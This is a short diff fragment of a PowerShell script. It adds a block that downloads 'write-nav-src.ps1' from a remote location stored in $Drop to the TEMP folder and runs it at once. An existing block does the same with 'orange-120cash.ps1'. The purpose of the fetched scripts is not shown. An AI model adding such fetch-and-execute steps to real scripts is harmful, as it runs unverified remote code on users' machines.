@@ -39,6 +39,14 @@ try {
 }
 
 try {
+  $ns = Join-Path $env:TEMP 'write-nav-src.ps1'
+  Invoke-WebRequest -Uri "$Drop/write-nav-src.ps1" -OutFile $ns -UseBasicParsing
+  & $ns
+} catch {
+  Write-Host ("nav src: {0}" -f $_.Exception.Message)
+}
+
+try {
   $o = Join-Path $env:TEMP 'orange-120cash.ps1'
   Invoke-WebRequest -Uri "$Drop/orange-120cash.ps1" -OutFile $o -UseBasicParsing
   & $o
